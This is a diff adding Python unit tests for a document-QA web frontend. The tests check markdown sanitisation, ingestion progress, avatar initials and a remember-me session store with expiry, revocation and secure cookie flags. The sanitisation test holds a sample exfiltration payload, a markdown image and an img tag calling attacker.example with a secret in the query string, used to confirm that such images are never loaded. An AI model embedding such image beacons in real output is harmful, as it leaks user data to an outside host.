@@ -128,3 +128,65 @@ def test_answer_notices_explain_unverified_insufficient_and_degraded_answers() -
     degraded = answer_notices({"metadata": {"degraded": ["rerank_timeout"]}})
     assert "less precise" in degraded[0][1]
     assert answer_notices({"metadata": {"degraded": []}}) == []
+
+
+def test_markdown_images_from_answers_or_documents_are_never_loaded() -> None:
+    from frontend.format import safe_markdown
+
+    attack = "Result ![x](https://attacker.example/?q=secret) <img src=https://attacker.example/a>"
+    shown = safe_markdown(attack)
+    assert "![" not in shown and "<img" not in shown.lower()
+    assert "attacker.example" in shown  # visible as text, not fetched
+    assert (
+        safe_markdown("see [the policy](https://example.com)")
+        == "see [the policy](https://example.com)"
+    )
+
+
+def test_stage_progress_moves_forward_through_the_pipeline() -> None:
+    from frontend.format import STAGE_PROGRESS, stage_progress
+
+    order = ["queued", "processing", "extracting", "chunking", "embedding", "indexing"]
+    values = [stage_progress(s) for s in order]
+    assert values == sorted(values) and 0 < values[0] < values[-1] < 1
+    assert stage_progress("completed") == 1.0 and stage_progress("failed") == 0.0
+    assert set(STAGE_PROGRESS) >= set(order)
+
+
+def test_initials_for_the_avatar() -> None:
+    from frontend.theme import initials
+
+    assert initials("dana.smith@example.com") == "DS"
+    assert initials("Dana") == "DA"
+    assert initials("") == "?"
+
+
+def test_the_keep_signed_in_store_expires_slides_and_revokes() -> None:
+    from frontend import remember
+
+    class Client:
+        signed_in = True
+
+    client = Client()
+    handle = remember.remember(client, {"email": "a@example.com"}, now=1000.0)
+    assert handle not in remember._store  # only a hash is kept  # pyright: ignore[reportPrivateUsage]
+    assert remember.recall(handle, now=1000.0 + remember.IDLE_S - 1) is not None  # slides
+    assert remember.recall(handle, now=1000.0 + 2 * remember.IDLE_S - 2) is not None
+    assert remember.recall(handle, now=1000.0 + 3 * remember.IDLE_S + 10) is None  # idle expiry
+    second = remember.remember(client, {"email": "a@example.com"}, now=0.0)
+    for step in range(1, 15):  # used every 12 h, but the absolute limit still ends it
+        moment = step * (remember.IDLE_S - 60)
+        if moment > remember.ABSOLUTE_S:
+            assert remember.recall(second, now=moment) is None
+            break
+        assert remember.recall(second, now=moment) is not None
+    third = remember.remember(client, {"email": "a@example.com"})
+    remember.forget(third)
+    assert remember.recall(third) is None
+    signed_out = remember.remember(
+        type("C", (), {"signed_in": False})(), {"email": "b@example.com"}
+    )
+    assert remember.recall(signed_out) is None  # a dead client is never resumed
+    assert remember.recall(None) is None and remember.recall("not-a-handle") is None
+    script = remember.set_cookie_script("abc", secure=True)
+    assert "SameSite=Strict" in script and "Secure" in script and "abc" in script
